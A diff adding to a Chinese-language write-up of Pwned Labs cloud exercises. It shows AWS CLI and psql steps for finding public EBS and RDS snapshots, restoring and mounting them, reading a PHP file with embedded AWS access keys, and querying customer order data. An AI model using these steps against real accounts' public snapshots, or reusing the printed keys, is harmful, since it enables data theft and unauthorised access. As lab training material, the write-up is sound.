@@ -535,12 +535,29 @@ aws ec2 describe-snapshot-attribute --snapshot-id snap-0c0679098c7a4e636 --attri
 
 说明这个快照是公有的，所有人都可以根据这个快照创建卷。
 
+搜索快照：
+![image-20231111145308887](pwnedlabs.assets/image-20231111145308887.png)
+
+点击从快照恢复卷：
+
+![image-20231111145356824](pwnedlabs.assets/image-20231111145356824.png)
+
+挂载卷：
+
+![image-20231111145632451](pwnedlabs.assets/image-20231111145632451.png)
+
+
+
+
+
+
+
 接下来的思路就是根据这个公有快照创建卷，可用区选择和自己的 EC2 一样的，快照 ID 指定刚才随便找的快照。之后挂载卷attach volume，挂载成功后（没aws账号无法复现）：
 
 ```bash
 sudo fdisk -l
-sudo mkdir /test
-sudo mount /dev/xvdf3 /test
+sudo mkdir /tmp/test
+sudo mount /dev/xvdf1 /tmp/test
 sudo ls /test
 ```
 
@@ -549,6 +566,22 @@ sudo ls /test
 
 
 随后在home的下面可以找到s3_download_file.php：
+
+```bash
+sudo ls /tmp/test/home/intern/practice_files/s3_download_file.php
+/tmp/test/home/intern/practice_files/s3_download_file.php
+sudo cat /tmp/test/home/intern/practice_files/s3_download_file.php
+<?php
+  $BUCKET_NAME = 'ecorp-client-data';
+  $IAM_KEY = 'AKIARQVIRZ4UDSDT72VT';
+  $IAM_SECRET = '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';
+  require '/opt/vendor/autoload.php';
+  use Aws\S3\S3Client;
+  use Aws\S3\Exception\S3Exception;
+
+```
+
+
 
 ![image-20231021184110020](pwnedlabs.assets/image-20231021184110020.png)
 
@@ -599,7 +632,48 @@ aws ec2 describe-snapshots --owner-id self --restorable-by-user-ids all --no-pag
 
 ## 8.Plunder Public RDS Snapshots
 
-TODO，需要aws账号去复现。
+搜索一下公有快照
+
+```bash
+aws rds describe-db-snapshots --snapshot-type public --include-public --region us-east-1| grep 104506445608
+            "DBSnapshotIdentifier": "arn:aws:rds:us-east-1:104506445608:snapshot:orders-private",
+            "DBSnapshotArn": "arn:aws:rds:us-east-1:104506445608:snapshot:orders-private",
+            
+```
+
+
+
+![image-20231111131140709](pwnedlabs.assets/image-20231111131140709.png)
+
+选择后点击恢复快照，如果rds是私有则只能从ec2或者lambda连接， 因此为了方便直接publicl了：
+
+![image-20231111133715564](pwnedlabs.assets/image-20231111133715564.png)
+
+同时修改一下密码：
+
+![image-20231111134418123](pwnedlabs.assets/image-20231111134418123.png)
+
+
+
+然后就是连上数据库（记得挂魔法）：
+
+```bash
+psql -h snapshot-postgre.c11jyq4p58uf.us-east-1.rds.amazonaws.com -U postgres
+#列出所有库
+\list
+#连接cust_orders库
+\c cust_orders
+#列出所有表
+\dt
+#获得flag
+select * from flag;
+               flag
+----------------------------------
+ 6e1b93d735aa69a05f92155f1b4fd855
+(1 row)
+#获得大量的敏感信息
+select * from orders;
+```
 
 
 
